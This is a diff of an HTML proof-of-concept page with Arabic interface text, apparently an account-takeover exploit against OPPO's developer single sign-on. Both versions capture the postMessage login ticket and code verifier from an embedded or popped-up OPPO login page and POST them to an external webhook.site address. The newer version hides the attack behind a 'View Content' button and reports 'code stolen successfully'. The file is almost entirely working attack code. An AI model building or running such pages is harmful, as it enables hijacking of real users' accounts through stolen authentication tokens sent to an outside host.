@@ -1,68 +1,54 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="utf-8">
-    <title>OPPO ATO Exploit - Final Version</title>
+    <title>تجهيز فخ اصطياد الكود</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        #status-box { border: 2px solid #333; padding: 20px; background: #111; margin-bottom: 20px; }
-        .hit { border-color: #00ff00 !important; background: #002200 !important; }
-        iframe { border: 1px solid #444; width: 600px; height: 500px; background: #fff; }
-        .data-display { color: #ffeb3b; word-break: break-all; margin-top: 10px; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #0f0; color: #000; border: none; font-weight: bold; }
+        #status { margin-top: 20px; font-size: 18px; color: #ffeb3b; }
     </style>
 </head>
 <body>
-    <h1>نظام اختبار اختراق OPPO (ATO)</h1>
-    <div id="status-box">
-        <div id="msg">في انتظار استلام الـ Ticket... (تأكد من تسجيل الدخول في HeyTap)</div>
-        <div id="result" class="data-display"></div>
-    </div>
-
-    <div id="frame-container"></div>
+    <h1>اضغط لتحديث العرض</h1>
+    <button id="start">View Content</button>
+    <div id="status">في انتظار الضغط...</div>
 
     <script>
-        // 1. الإعدادات
-        const WEBHOOK_URL = "https://webhook.site/d5c8bb4e-44ab-4edd-aa98-ce5cb4712920";
-        const OPPO_BASE = "https://developers.oppomobile.com/user/web-sso/login-iframe";
-        const NESTED = OPPO_BASE + "?fromLocation=x";
-        const FINAL_TARGET = OPPO_BASE + "?fromLocation=" + encodeURIComponent(NESTED);
+        const WEBHOOK = "https://webhook.site/d5c8bb4e-44ab-4edd-aa98-ce5cb4712920";
+        const OPPO_URL = "https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=" + 
+                         encodeURIComponent("https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=x");
 
-        function sendExfil(label, data) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ label, data, time: new Date().toLocaleTimeString() }),
-                keepalive: true
-            });
-        }
-
-        // 2. مراقب الرسائل (المصيدة)
-        window.addEventListener('message', function(event) {
-            console.log("رسالة واردة من:", event.origin);
+        document.getElementById('start').onclick = function() {
+            document.getElementById('status').innerText = "تم فتح النافذة، جاري مراقبة الكود...";
             
-            if (event.data && event.data.channel === 'sdk-login-status') {
-                const payload = event.data.data;
-                if (payload && payload.ticket) {
-                    // النجاح!
-                    document.getElementById('status-box').classList.add('hit');
-                    document.getElementById('msg').innerHTML = "🎯 تم استخراج الـ Ticket بنجاح!";
-                    document.getElementById('result').innerHTML = `
-                        <strong>Ticket:</strong> ${payload.ticket}<br>
-                        <strong>Verifier:</strong> ${payload.codeVerifier}
-                    `;
-                    sendExfil("SUCCESS_EXPLOIT", payload);
+            // فتح نافذة الـ SSO
+            // سنحتفظ بمرجع للنافذة (targetWindow)
+            const targetWindow = window.open(OPPO_URL, "oppo_login", "width=600,height=700");
+
+            // مراقبة الرسائل القادمة من النافذة الجديدة
+            window.addEventListener('message', function(event) {
+                // نحن نبحث عن أي رسالة تحتوي على ticket أو code
+                if (event.data) {
+                    console.log("تم اصطياد بيانات!", event.data);
+                    
+                    // إرسال البيانات فوراً للويب هوك
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            label: "STOLEN_DATA_FOUND",
+                            payload: event.data,
+                            origin: event.origin
+                        })
+                    });
+
+                    if (event.data.channel === 'sdk-login-status') {
+                        alert("تم سرقة الكود بنجاح! افحص الويب هوك.");
+                        document.getElementById('status').innerText = "✅ تم الاستيلاء على البيانات!";
+                    }
                 }
-            }
-        }, false);
-
-        // 3. حقن الـ Iframe مع تقييد الهروب (Sandbox)
-        // هنا السر: لم نضع allow-top-navigation لمنع الصفحة من الإغلاق
-        const ifr = document.createElement('iframe');
-        ifr.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
-        ifr.src = FINAL_TARGET;
-        document.getElementById('frame-container').appendChild(ifr);
-
-        sendExfil("POC_INITIALIZED", { target: FINAL_TARGET });
+            });
+        };
     </script>
 </body>
 </html>
